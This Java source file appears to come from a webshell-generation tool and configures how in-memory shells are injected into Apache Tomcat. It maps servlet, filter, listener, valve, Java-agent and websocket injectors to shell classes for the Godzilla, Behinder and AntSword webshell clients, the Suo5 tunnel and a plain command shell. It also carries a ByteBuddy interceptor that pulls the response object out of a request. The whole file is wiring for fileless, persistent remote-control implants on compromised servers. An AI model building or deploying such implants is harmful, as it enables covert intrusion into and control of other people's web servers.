package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordServlet;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordValve;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderValve;
import com.reajason.javaweb.memshell.shelltool.command.*;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Valve;
import com.reajason.javaweb.memshell.tomcat.injector.*;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public class TomcatShell extends AbstractShell {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                response = ShellCommonUtil.getFieldValue(request, "response");
            }
        }
    }

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, TomcatServletInjector.class)
                .addInjector(JAKARTA_SERVLET, TomcatServletInjector.class)
                .addInjector(FILTER, TomcatFilterInjector.class)
                .addInjector(JAKARTA_FILTER, TomcatFilterInjector.class)
                .addInjector(LISTENER, TomcatListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, TomcatListenerInjector.class)
                .addInjector(VALVE, TomcatValveInjector.class)
                .addInjector(JAKARTA_VALVE, TomcatValveInjector.class)
                .addInjector(ShellType.AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
                .addInjector(WEBSOCKET, TomcatWebSocketInjector.class)
                .build();
    }

    @Override
    protected void init() {
        Class<?> commandListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Command);
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(SERVLET, CommandServlet.class)
                .addShellClass(JAKARTA_SERVLET, CommandServlet.class)
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(JAKARTA_FILTER, CommandFilter.class)
                .addShellClass(LISTENER, commandListenerClass)
                .addShellClass(JAKARTA_LISTENER, commandListenerClass)
                .addShellClass(VALVE, CommandValve.class)
                .addShellClass(JAKARTA_VALVE, CommandValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, CommandFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, CommandFilterChainAdvisor.class)
                .addShellClass(WEBSOCKET, CommandWebSocket.class)
                .build());

        Class<?> godzillaListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Godzilla);
        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(SERVLET, GodzillaServlet.class)
                .addShellClass(JAKARTA_SERVLET, GodzillaServlet.class)
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(JAKARTA_FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, godzillaListenerClass)
                .addShellClass(JAKARTA_LISTENER, godzillaListenerClass)
                .addShellClass(VALVE, GodzillaValve.class)
                .addShellClass(JAKARTA_VALVE, GodzillaValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, GodzillaFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, GodzillaFilterChainAdvisor.class)
                .build());

        Class<?> behinderListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Behinder);
        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(SERVLET, BehinderServlet.class)
                .addShellClass(JAKARTA_SERVLET, BehinderServlet.class)
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(JAKARTA_FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, behinderListenerClass)
                .addShellClass(JAKARTA_LISTENER, behinderListenerClass)
                .addShellClass(VALVE, BehinderValve.class)
                .addShellClass(JAKARTA_VALVE, BehinderValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, BehinderFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, BehinderFilterChainAdvisor.class)
                .build());

        Class<?> suo5ListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Suo5);
        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(SERVLET, Suo5Servlet.class)
                .addShellClass(JAKARTA_SERVLET, Suo5Servlet.class)
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(JAKARTA_FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, suo5ListenerClass)
                .addShellClass(JAKARTA_LISTENER, suo5ListenerClass)
                .addShellClass(VALVE, Suo5Valve.class)
                .addShellClass(JAKARTA_VALVE, Suo5Valve.class)
                .build());

        Class<?> antSwordListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.AntSword);
        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(SERVLET, AntSwordServlet.class)
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, antSwordListenerClass)
                .addShellClass(VALVE, AntSwordValve.class)
                .addShellClass(ShellType.AGENT_FILTER_CHAIN, AntSwordFilterChainAdvisor.class)
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, AntSwordFilterChainAdvisor.class)
                .build());
    }
}